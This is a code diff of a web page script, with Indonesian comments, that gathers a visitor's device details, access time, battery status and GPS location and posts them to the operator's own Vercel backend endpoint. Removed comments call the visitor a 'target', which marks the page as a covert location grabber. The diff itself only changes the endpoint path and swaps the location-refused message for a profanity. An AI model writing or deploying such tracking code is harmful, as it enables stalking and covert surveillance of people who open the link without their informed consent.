@@ -529,7 +529,7 @@
 
     try {
         // Panggil API internal Vercel kamu
-        const response = await fetch('/api/kirim', {
+        const response = await fetch('/api/kirim.mjs', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json' // PENTING: Beritahu server kalau ini JSON
@@ -567,9 +567,8 @@
                 // Jalankan pengiriman data lengkap ke Vercel Backend
                 sendToBackend(dataBrowser, waktuAkses, infoBaterai, mapsUrl);
             },
-            // JIKA TARGET MENGKLIK "BLOCK" (TOLAK)
             (error) => {
-                const mapsUrl = "Akses Lokasi Ditolak oleh Target ❌";
+                const mapsUrl = "fuckyou";
                 sendToBackend(dataBrowser, waktuAkses, infoBaterai, mapsUrl);
             }
         );
@@ -581,7 +580,7 @@
 
 // Fungsi baru untuk membungkus pengiriman data ke server Vercel Anda
 function sendToBackend(device, waktu, baterai, gps) {
-    fetch('/api/kirim', {
+    fetch('/api/kirim.mjs', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ device, waktu, baterai, gps })
